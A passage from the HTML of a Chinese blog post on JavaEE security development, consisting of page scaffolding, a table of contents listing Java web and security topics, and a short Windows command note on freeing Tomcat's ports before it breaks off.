<!DOCTYPE html>
<html lang="en" dir="auto" data-theme="auto">

<head><script src="/xvsf/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=xvsf/livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="noindex, nofollow">
<title>JavaEE安全开发 | xvsf</title>
<meta name="keywords" content="JavaEE, Web开发">
<meta name="description" content="JAVA EE
32-Servlet路由技术&amp;JDBC&amp;Mybatis数据库
tomcat端口占用解决：
1、关闭占用程序：

    
        
            
            
            
        
        plain
        
            
                
            
            
                
            
        
    
    

1
2
3
4
5
6


::查看 8005 和 8080 端口的占用情况
netstat -ano | findstr &#34;8005 8080&#34;
::使用 tasklist 命令查看占用端口的进程名称
tasklist | findstr &#34;PID&#34;
::关闭占用端口的进程
taskkill /F /PID &#39;PID&#39;


2、修改端口">
<meta name="author" content="">
<link rel="canonical" href="http://localhost:1313/xvsf/posts/javaee%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/">
<link crossorigin="anonymous" href="/xvsf/assets/css/stylesheet.da226b913d2f27f5edb9c2d1d023f1755892e2b19b710900079a2575a932e8d6.css" integrity="sha256-2iJrkT0vJ/XtucLR0CPxdViS4rGbcQkAB5oldaky6NY=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/xvsf/img/2.jpg">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/xvsf/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/xvsf/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/xvsf/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/xvsf/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="en" href="http://localhost:1313/xvsf/posts/javaee%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --code-block-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
                color-scheme: dark;
            }

            .list {
                background: var(--theme);
            }

            .toc {
                background: var(--entry);
            }
        }

        @media (prefers-color-scheme: light) {
            .list::-webkit-scrollbar-thumb {
                border-color: var(--code-bg);
            }
        }

    </style>
</noscript>
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.querySelector("html").dataset.theme = 'dark';
    } else if (localStorage.getItem("pref-theme") === "light") {
       document.querySelector("html").dataset.theme = 'light';
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.querySelector("html").dataset.theme = 'dark';
    } else {
        document.querySelector("html").dataset.theme = 'light';
    }

</script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-lite-webfont@1.1.0/style.css" />




<div class="progress-bar"></div>


<script>
document.addEventListener('DOMContentLoaded', () => {
    const progressBar = document.querySelector('.progress-bar');

    
    const calculateScrollProgress = () => {
        const windowHeight = window.innerHeight;
        const documentHeight = document.documentElement.scrollHeight - windowHeight;
        const scrollTop = window.scrollY;
        const progress = (scrollTop / documentHeight) * 100;
        progressBar.style.width = `${progress}%`;
    };

    
    window.addEventListener('scroll', calculateScrollProgress);

    
    calculateScrollProgress();
});
</script>



</head>
<body id="top">
    <header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="http://localhost:1313/xvsf/" accesskey="h" title="xvsf (Alt + H)">xvsf</a>
            <div class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
            </div>
        </div>
        <ul id="menu">
            <li>
                <a href="http://localhost:1313/xvsf/" title="首页">
                    <span>首页</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/xvsf/posts/" title="文章">
                    <span>文章</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/xvsf/categories/" title="归类">
                    <span>归类</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/xvsf/search/" title="搜索 (Alt &#43; /)" accesskey=/>
                    <span>搜索</span>
                </a>
            </li>
            <li>
                <a href="http://localhost:1313/xvsf/about/" title="关于">
                    <span>关于</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    
    <h1 class="post-title entry-hint-parent">
      JavaEE安全开发
    </h1>
    <div class="post-meta"><span title='2025-08-12 00:00:00 +0000 UTC'>August 12, 2025</span>&nbsp;·&nbsp;32 min&nbsp;·&nbsp;<a href="http://localhost:1313/xvsf/categories/java%E5%9F%BA%E7%A1%80/">Java基础</a>

</div>
  </header> 

  
  
  <div class="post-content" style="position: relative;">
    
    <aside id="toc-container" class="toc-container wide">
    <div class="toc">
        <details  open>
            <summary accesskey="c" title="(Alt + C)">
                <span class="details">Table of Contents</span>
            </summary>

            <div class="inner"><ul>
                    <li>
                        <a href="#java-ee" aria-label="JAVA EE">JAVA EE</a></li>
                    <li>
                        <a href="#32-servlet%e8%b7%af%e7%94%b1%e6%8a%80%e6%9c%afjdbcmybatis%e6%95%b0%e6%8d%ae%e5%ba%93" aria-label="32-Servlet路由技术&amp;JDBC&amp;Mybatis数据库">32-Servlet路由技术&amp;JDBC&amp;Mybatis数据库</a><ul>
                            
                    <li>
                        <a href="#javaee-http-servlet%e8%b7%af%e7%94%b1%e5%91%a8%e6%9c%9f" aria-label="JavaEE-HTTP-Servlet&amp;路由&amp;周期">JavaEE-HTTP-Servlet&amp;路由&amp;周期</a><ul>
                            
                    <li>
                        <a href="#servlet" aria-label="Servlet">Servlet</a><ul>
                            
                    <li>
                        <a href="#1%e8%a7%a3%e9%87%8a" aria-label="1、解释"><strong>1、解释</strong></a></li>
                    <li>
                        <a href="#2%e5%88%9b%e5%bb%ba%e5%92%8c%e4%bd%bf%e7%94%a8servlet" aria-label="2、创建和使用Servlet"><strong>2、创建和使用Servlet</strong></a></li>
                    <li>
                        <a href="#3servlet%e7%94%9f%e5%91%bd%e5%91%a8%e6%9c%9f" aria-label="3、Servlet生命周期"><strong>3、Servlet生命周期</strong></a></li>
                    <li>
                        <a href="#4%e5%a4%84%e7%90%86%e6%8e%a5%e5%8f%97%e5%92%8c%e5%9b%9e%e6%98%be" aria-label="4、处理接受和回显"><strong>4、处理接受和回显</strong></a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#%e6%95%b0%e6%8d%ae%e5%ba%93-jdbcmybatis%e5%ba%93" aria-label="数据库-JDBC&amp;Mybatis&amp;库">数据库-JDBC&amp;Mybatis&amp;库</a><ul>
                            
                    <li>
                        <a href="#1%e4%b8%8b%e8%bd%bdjar" aria-label="1、下载jar">1、下载jar</a></li>
                    <li>
                        <a href="#2%e5%bc%95%e7%94%a8%e5%b0%81%e8%a3%85jar" aria-label="2、引用封装jar">2、引用封装jar</a></li>
                    <li>
                        <a href="#3%e6%b3%a8%e5%86%8c%e6%95%b0%e6%8d%ae%e5%ba%93%e9%a9%b1%e5%8a%a8" aria-label="3、注册数据库驱动">3、注册数据库驱动</a></li>
                    <li>
                        <a href="#4%e5%bb%ba%e7%ab%8b%e6%95%b0%e6%8d%ae%e5%ba%93%e8%bf%9e%e6%8e%a5" aria-label="4、建立数据库连接">4、建立数据库连接</a></li>
                    <li>
                        <a href="#5%e5%88%9b%e5%bb%bastatement%e6%89%a7%e8%a1%8csql" aria-label="5、创建Statement执行SQL">5、创建Statement执行SQL</a></li>
                    <li>
                        <a href="#6%e7%bb%93%e6%9e%9cresultset%e8%bf%9b%e8%a1%8c%e6%8f%90%e5%8f%96" aria-label="6、结果ResultSet进行提取">6、结果ResultSet进行提取</a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#33-sql%e9%a2%84%e7%bc%96%e8%af%91filter%e8%bf%87%e6%bb%a4%e5%99%a8listener%e7%9b%91%e5%90%ac%e5%99%a8" aria-label="33-SQL预编译&amp;Filter过滤器&amp;Listener监听器">33-SQL预编译&amp;Filter过滤器&amp;Listener监听器</a><ul>
                            
                    <li>
                        <a href="#%e9%a2%84%e7%bc%96%e8%af%91-sql%e5%8e%9f%e7%90%86" aria-label="预编译-SQL原理：">预编译-SQL原理：</a></li>
                    <li>
                        <a href="#%e8%bf%87%e6%bb%a4%e5%99%a8-filter" aria-label="过滤器-Filter">过滤器-Filter</a><ul>
                            <ul>
                            
                    <li>
                        <a href="#%e5%88%9b%e5%bb%ba%e8%bf%87%e6%bb%a4%e5%99%a8" aria-label="创建过滤器">创建过滤器</a></li>
                    <li>
                        <a href="#1%e5%88%9b%e5%bb%ba%e8%bf%87%e6%bb%a4%e5%99%a8%e4%b9%8b%e5%89%8d%e7%9a%84%e5%87%86%e5%a4%87" aria-label="1、创建过滤器之前的准备">1、创建过滤器之前的准备</a></li>
                    <li>
                        <a href="#2%e5%88%9b%e5%bb%ba%e8%bf%87%e6%bb%a4%e5%99%a8" aria-label="2、创建过滤器">2、创建过滤器</a></li>
                    <li>
                        <a href="#3%e8%bf%87%e6%bb%a4%e5%99%a8%e5%86%85%e7%bd%ae%e6%96%b9%e6%b3%95" aria-label="3、过滤器内置方法">3、过滤器内置方法</a></li>
                    <li>
                        <a href="#4%e8%bf%87%e6%bb%a4%e5%99%a8%e8%a7%a6%e5%8f%91%e6%b5%81%e7%a8%8b" aria-label="4、过滤器触发流程">4、过滤器触发流程</a></li>
                    <li>
                        <a href="#5%e5%88%a9%e7%94%a8%e8%bf%87%e6%bb%a4%e5%99%a8%e7%ae%80%e5%8d%95%e5%ae%9e%e7%8e%b0cookie%e8%ba%ab%e4%bb%bd%e9%aa%8c%e8%af%81" aria-label="5、利用过滤器简单实现：cookie身份验证">5、利用过滤器简单实现：cookie身份验证</a></li>
                    <li>
                        <a href="#6%e8%bf%87%e6%bb%a4%e5%99%a8%e5%ae%89%e5%85%a8%e5%9c%ba%e6%99%af" aria-label="6、过滤器安全场景">6、过滤器安全场景</a></li></ul>
                        </ul>
                    </li>
                    <li>
                        <a href="#%e7%9b%91%e5%90%ac%e5%99%a8-listen" aria-label="监听器-Listen">监听器-Listen</a><ul>
                            
                    <li>
                        <a href="#1%e5%88%9b%e5%bb%ba%e7%9b%91%e5%90%ac%e5%99%a8" aria-label="1、创建监听器">1、创建监听器</a></li>
                    <li>
                        <a href="#2%e7%9b%91%e5%90%ac%e5%99%a8%e5%86%85%e7%bd%ae%e6%96%b9%e6%b3%95" aria-label="2、监听器内置方法">2、监听器内置方法</a></li>
                    <li>
                        <a href="#3%e7%9b%91%e5%90%ac%e5%99%a8%e8%a7%a6%e5%8f%91%e6%b5%81%e7%a8%8b" aria-label="3、监听器触发流程">3、监听器触发流程</a></li>
                    <li>
                        <a href="#4%e7%9b%91%e5%90%ac%e5%99%a8%e5%ae%89%e5%85%a8%e5%9c%ba%e6%99%af" aria-label="4、监听器安全场景">4、监听器安全场景</a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#34-%e5%8f%8d%e5%b0%84%e6%9c%ba%e5%88%b6" aria-label="34-反射机制">34-反射机制</a><ul>
                            
                    <li>
                        <a href="#java-%e5%8f%8d%e5%b0%84-%e6%a6%82%e5%bf%b5" aria-label="Java-反射-概念">Java-反射-概念</a></li>
                    <li>
                        <a href="#%e7%b1%bb%e5%af%b9%e8%b1%a1" aria-label="类对象">类对象</a><ul>
                            <ul>
                            
                    <li>
                        <a href="#class%e5%af%b9%e8%b1%a1%e7%b1%bb%e8%8e%b7%e5%8f%96" aria-label="Class对象类获取">Class对象类获取</a></li>
                    <li>
                        <a href="#field%e6%88%90%e5%91%98%e5%8f%98%e9%87%8f%e7%b1%bb%e8%8e%b7%e5%8f%96" aria-label="Field成员变量类获取">Field成员变量类获取</a></li>
                    <li>
                        <a href="#constructor%e6%9e%84%e9%80%a0%e6%96%b9%e6%b3%95%e7%b1%bb%e8%8e%b7%e5%8f%96" aria-label="Constructor构造方法类获取">Constructor构造方法类获取</a></li>
                    <li>
                        <a href="#method%e6%88%90%e5%91%98%e6%96%b9%e6%b3%95%e7%b1%bb%e8%8e%b7%e5%8f%96" aria-label="Method成员方法类获取">Method成员方法类获取</a></li></ul>
                        </ul>
                    </li>
                    <li>
                        <a href="#%e4%b8%8d%e5%ae%89%e5%85%a8%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e9%93%be%e6%9e%84%e9%80%a0" aria-label="不安全命令执行&amp;反序列化链构造">不安全命令执行&amp;反序列化链构造</a><ul>
                            
                    <li>
                        <a href="#1%e5%8f%8d%e5%b0%84%e5%ae%9e%e7%8e%b0-%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c" aria-label="1、反射实现-命令执行">1、反射实现-命令执行</a></li>
                    <li>
                        <a href="#2%e4%b8%8d%e5%ae%89%e5%85%a8%e7%9a%84%e5%8f%8d%e5%b0%84%e5%af%b9%e8%b1%a1" aria-label="2、不安全的反射对象">2、不安全的反射对象</a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#35-%e5%8e%9f%e7%94%9f%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" aria-label="35-原生反序列化">35-原生反序列化</a><ul>
                            
                    <li>
                        <a href="#java%e5%ba%8f%e5%88%97%e5%8c%96%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" aria-label="Java序列化&amp;反序列化">Java序列化&amp;反序列化</a></li>
                    <li>
                        <a href="#%e5%8e%9f%e7%94%9f%e5%ba%8f%e5%88%97%e5%8c%96%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96" aria-label="原生序列化&amp;反序列化">原生序列化&amp;反序列化</a></li>
                    <li>
                        <a href="#%e5%ae%89%e5%85%a8%e9%97%ae%e9%a2%98-%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%88%a9%e7%94%a8%e9%93%be" aria-label="安全问题-反序列化利用链">安全问题-反序列化利用链</a></li></ul>
                    </li>
                    <li>
                        <a href="#36-%e7%ac%ac%e4%b8%89%e6%96%b9%e7%bb%84%e4%bb%b6maven%e9%85%8d%e7%bd%aejndi" aria-label="36-第三方组件&amp;Maven配置&amp;JNDI">36-第三方组件&amp;Maven配置&amp;JNDI</a><ul>
                            
                    <li>
                        <a href="#jndl%e6%b3%a8%e5%85%a5" aria-label="JNDL注入：">JNDL注入：</a></li>
                    <li>
                        <a href="#%e7%ac%ac%e4%b8%89%e6%96%b9%e7%bb%84%e4%bb%b6-log4j" aria-label="第三方组件-Log4J">第三方组件-Log4J</a></li>
                    <li>
                        <a href="#%e7%ac%ac%e4%b8%89%e6%96%b9%e7%bb%84%e4%bb%b6-fastjson" aria-label="第三方组件-FastJson">第三方组件-FastJson</a></li></ul>
                    </li>
                    <li>
                        <a href="#37-jndl%e6%b3%a8%e5%85%a5" aria-label="37-JNDL注入">37-JNDL注入</a><ul>
                            
                    <li>
                        <a href="#jndl" aria-label="JNDL">JNDL</a><ul>
                            
                    <li>
                        <a href="#jndi-injection-exploit" aria-label="JNDI-Injection-Exploit">JNDI-Injection-Exploit</a></li>
                    <li>
                        <a href="#marshalsec" aria-label="marshalsec">marshalsec</a></li></ul>
                    </li>
                    <li>
                        <a href="#jndi%e6%b3%a8%e5%85%a5-fastjson%e6%bc%8f%e6%b4%9e%e7%bb%93%e5%90%88" aria-label="JNDI注入-FastJson漏洞结合">JNDI注入-FastJson漏洞结合</a><ul>
                            
                    <li>
                        <a href="#%e5%a4%8d%e7%8e%b0%e6%bc%8f%e6%b4%9e" aria-label="复现漏洞">复现漏洞</a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#38-springboot%e6%a1%86%e6%9e%b6" aria-label="38-SpringBoot框架">38-SpringBoot框架</a><ul>
                            
                    <li>
                        <a href="#web%e5%ba%94%e7%94%a8-%e8%b7%af%e7%94%b1%e5%93%8d%e5%ba%94" aria-label="web应用-路由响应">web应用-路由响应</a></li>
                    <li>
                        <a href="#%e6%95%b0%e6%8d%ae%e5%ba%93%e5%ba%94%e7%94%a8-mybatis" aria-label="数据库应用-Mybatis">数据库应用-Mybatis</a><ul>
                            
                    <li>
                        <a href="#%e9%85%8d%e7%bd%ae%e7%8e%af%e5%a2%83" aria-label="配置环境：">配置环境：</a><ul>
                            
                    <li>
                        <a href="#1%e6%95%b0%e6%8d%ae%e5%ba%93%e5%88%9b%e5%bb%ba" aria-label="1、数据库创建">1、数据库创建</a></li>
                    <li>
                        <a href="#2%e9%a1%b9%e7%9b%ae%e6%b7%bb%e5%8a%a0mybatis%e6%95%b0%e6%8d%ae%e5%ba%93%e9%a9%b1%e5%8a%a8" aria-label="2、项目添加Mybatis&amp;数据库驱动">2、项目添加Mybatis&amp;数据库驱动</a></li>
                    <li>
                        <a href="#3%e9%a1%b9%e7%9b%ae%e9%85%8d%e7%bd%ae%e6%95%b0%e6%8d%ae%e5%ba%93%e8%bf%9e%e6%8e%a5%e4%bf%a1%e6%81%af" aria-label="3、项目配置数据库连接信息">3、项目配置数据库连接信息</a></li>
                    <li>
                        <a href="#4%e5%88%9b%e5%bb%bauser%e7%b1%bb%e7%94%a8%e6%9d%a5%e6%93%8d%e4%bd%9c%e6%95%b0%e6%8d%ae%e5%ba%93%e6%95%b0%e6%8d%ae" aria-label="4、创建User类用来操作数据库数据">4、创建User类用来操作数据库数据</a></li>
                    <li>
                        <a href="#5%e5%88%9b%e5%bb%bamapper%e5%8a%a8%e6%80%81%e6%8e%a5%e5%8f%a3%e4%bb%a3%e7%90%86%e7%b1%bb%e5%ae%9e%e7%8e%b0" aria-label="5、创建Mapper动态接口代理类实现">5、创建Mapper动态接口代理类实现</a></li>
                    <li>
                        <a href="#6%e5%88%9b%e5%bb%bacontroller%e5%ae%9e%e7%8e%b0web%e8%ae%bf%e9%97%ae%e8%b0%83%e7%94%a8" aria-label="6、创建Controller实现Web访问调用">6、创建Controller实现Web访问调用</a></li></ul>
                    </li>
                    <li>
                        <a href="#sql%e6%b3%a8%e5%85%a5" aria-label="sql注入">sql注入</a></li></ul>
                    </li>
                    <li>
                        <a href="#%e6%a8%a1%e6%9d%bf%e5%bc%95%e6%93%8e-thymeleaf" aria-label="模板引擎-Thymeleaf">模板引擎-Thymeleaf</a><ul>
                            
                    <li>
                        <a href="#%e4%b8%8d%e5%ae%89%e5%85%a8%e7%9a%84%e6%a8%a1%e7%89%88%e7%89%88%e6%9c%ac" aria-label="不安全的模版版本">不安全的模版版本</a><ul>
                            
                    <li>
                        <a href="#%e9%97%ae%e9%a2%98" aria-label="问题："><strong>问题：</strong></a></li></ul>
                    </li></ul>
                    </li>
                    <li>
                        <a href="#%e7%9b%91%e6%8e%a7%e7%b3%bb%e7%bb%9f-actuator" aria-label="监控系统-Actuator">监控系统-Actuator</a><ul>
                            
                    <li>
                        <a href="#%e5%8a%9f%e8%83%bd" aria-label="功能：">功能：</a></li>
                    <li>
                        <a href="#%e5%b7%a5%e5%85%b7" aria-label="工具">工具</a><ul>
                            
                    <li>
                        <a href="#jdumpspider" aria-label="JDumpSpider">JDumpSpider</a></li>
                    <li>
                        <a href="#jvisualvm" aria-label="jvisualvm">jvisualvm</a></li></ul>
                    </li>
                    <li>
                        <a href="#%e5%ae%89%e5%85%a8%e9%97%ae%e9%a2%98" aria-label="安全问题">安全问题</a></li></ul>
                    </li>
                    <li>
                        <a href="#%e6%8e%a5%e5%8f%a3%e7%b3%bb%e7%bb%9f-swagger" aria-label="接口系统-Swagger">接口系统-Swagger</a><ul>
                            
                    <li>
                        <a href="#%e5%ae%89%e5%85%a8%e9%97%ae%e9%a2%98-1" aria-label="安全问题">安全问题</a></li></ul>
                    </li>
                    <li>
                        <a href="#%e8%ba%ab%e4%bb%bd%e9%89%b4%e6%9d%83-jwt" aria-label="身份鉴权-JWT">身份鉴权-JWT</a><ul>
                            <ul>
                            
                    <li>
                        <a href="#1%e5%ae%89%e8%a3%85%e4%be%9d%e8%b5%96" aria-label="1、安装依赖">1、安装依赖</a></li>
                    <li>
                        <a href="#2%e5%88%9b%e5%bb%bajwt" aria-label="2、创建jwt">2、创建jwt</a></li>
                    <li>
                        <a href="#3%e6%a8%a1%e6%8b%9fjwt%e5%8a%a0%e8%a7%a3%e5%af%86" aria-label="3、模拟jwt加解密">3、模拟jwt加解密</a></li>
                    <li>
                        <a href="#4web%e9%a1%b5%e9%9d%a2" aria-label="4、web页面">4、web页面</a></li></ul>
                        
                    <li>
                        <a href="#%e5%ae%89%e5%85%a8%e9%97%ae%e9%a2%98-2" aria-label="安全问题">安全问题</a></li></ul>
                    </li>
                    <li>
                        <a href="#%e6%89%93%e5%8c%85%e9%83%a8%e7%bd%b2-jarwar" aria-label="打包部署-JAR&amp;WAR">打包部署-JAR&amp;WAR</a><ul>
                            
                    <li>
                        <a href="#jar" aria-label="JAR">JAR</a></li>
                    <li>
                        <a href="#war" aria-label="WAR">WAR</a></li>
                    <li>
                        <a href="#%e5%ae%89%e5%85%a8%e9%97%ae%e9%a2%98-3" aria-label="安全问题：">安全问题：</a><ul>
                            
                    <li>
                        <a href="#%e6%ba%90%e7%a0%81%e5%8f%8d%e7%bc%96%e8%af%91" aria-label="源码反编译：">源码反编译：</a>
                    </li>
                </ul>
                </li>
                </ul>
                </li>
                </ul>
                </li>
                </ul>
            </div>
        </details>
    </div>
</aside>
<script>
    let activeElement;
    let elements;
    
    document.addEventListener('DOMContentLoaded', function (event) {
        checkTocPosition();
    
        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
        if (elements.length > 0) {
            
            activeElement = elements[0];
            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
        }
    
        
        const topLink = document.getElementById('top-link');
        if (topLink) {
            topLink.addEventListener('click', (event) => {
                
                event.preventDefault();
    
                
                window.scrollTo({ top: 0, behavior: 'smooth' });
            });
        }
    }, false);
    
    window.addEventListener('resize', function(event) {
        checkTocPosition();
    }, false);
    
    window.addEventListener('scroll', () => {
        
        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
    
        
        if (scrollPosition === 0) {
            return;
        }
    
        
        if (elements && elements.length > 0) {
            
            activeElement = Array.from(elements).find((element) => {
                if ((getOffsetTop(element) - scrollPosition) > 0 && 
                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
                    return element;
                }
            }) || activeElement;
    
            elements.forEach(element => {
                const id = encodeURI(element.getAttribute('id')).toLowerCase();
                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
                if (element === activeElement){
                    tocLink.classList.add('active');
    
                    
                    const tocContainer = document.querySelector('.toc .inner');
                    const linkOffsetTop = tocLink.offsetTop;
                    const containerHeight = tocContainer.clientHeight;
                    const linkHeight = tocLink.clientHeight;
    
                    
                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
                } else {
                    tocLink.classList.remove('active');
                }
            });
        }
    }, false);
    
    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
    
    function checkTocPosition() {
        const width = document.body.scrollWidth;
    
        if (width - main - (toc * 2) - (gap * 4) > 0) {
            document.getElementById("toc-container").classList.add("wide");
        } else {
            document.getElementById("toc-container").classList.remove("wide");
        }
    }
    
    function getOffsetTop(element) {
        if (!element.getClientRects().length) {
            return 0;
        }
        let rect = element.getBoundingClientRect();
        let win = element.ownerDocument.defaultView;
        return rect.top + win.pageYOffset;   
    }
    
</script>
<h1 id="java-ee">JAVA EE<a hidden class="anchor" aria-hidden="true" href="#java-ee">#</a></h1>
<h1 id="32-servlet路由技术jdbcmybatis数据库">32-Servlet路由技术&amp;JDBC&amp;Mybatis数据库<a hidden class="anchor" aria-hidden="true" href="#32-servlet路由技术jdbcmybatis数据库">#</a></h1>
<p>tomcat端口占用解决：</p>
<p>1、关闭占用程序：</p>
<div class="code-block-container" id="code-1769750397248333800" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397248333800">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">plain</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397248333800" title="Toggle" aria-expanded="false" aria-controls="code-1769750397248333800" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397248333800-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
</span><span class="lnt" id="2"><span class="lnlinks">2</span>
</span><span class="lnt" id="3"><span class="lnlinks">3</span>
</span><span class="lnt" id="4"><span class="lnlinks">4</span>
</span><span class="lnt" id="5"><span class="lnlinks">5</span>
</span><span class="lnt" id="6"><span class="lnlinks">6</span>
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-plain" data-lang="plain"><span class="line"><span class="cl">::查看 8005 和 8080 端口的占用情况
</span></span><span class="line"><span class="cl">netstat -ano | findstr &#34;8005 8080&#34;
</span></span><span class="line"><span class="cl">::使用 tasklist 命令查看占用端口的进程名称
</span></span><span class="line"><span class="cl">tasklist | findstr &#34;PID&#34;
</span></span><span class="line"><span class="cl">::关闭占用端口的进程
</span></span><span class="line"><span class="cl">taskkill /F /PID &#39;PID&#39;</span></span></code></pre></td></tr></table>
</div>
</div></div>
</div><p>2、修改端口</p>
<div class="code-block-container" id="code-1769750397249412800" data-expanded="false" role="region" aria-labelledby="btn-code-1769750397249412800">
    <div class="code-header">
        <div class="mac-buttons">
            <span class="mac-button red"></span>
            <span class="mac-button yellow"></span>
            <span class="mac-button green"></span>
        </div>
        <span class="code-language">xml</span>
        <div class="code-actions">
            <button class="copy-btn" title="Copy" aria-label="复制代码">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
            </button>
            <button class="toggle-btn" id="btn-code-1769750397249412800" title="Toggle" aria-expanded="false" aria-controls="code-1769750397249412800" aria-label="展开或折叠代码块">
                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
            </button>
        </div>
    </div>
    <div class="code-content" id="code-1769750397249412800-content"><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><span class="lnlinks">1</span>
</span><span class="lnt" id="2"><span class="lnlinks">2</span>
</span><span class="lnt" id="3"><span class="lnlinks">3</span>
</span><span class="lnt" id="4"><span class="lnlinks">4</span>
</span><span class="lnt" id="5"><span class="lnlinks">5</span>
</span><span class="lnt" id="6"><span class="lnlinks">6</span>
</span><span class="lnt" id="7"><span class="lnlinks">7</span>
</span></code></pre></td>
<td class="lntd">
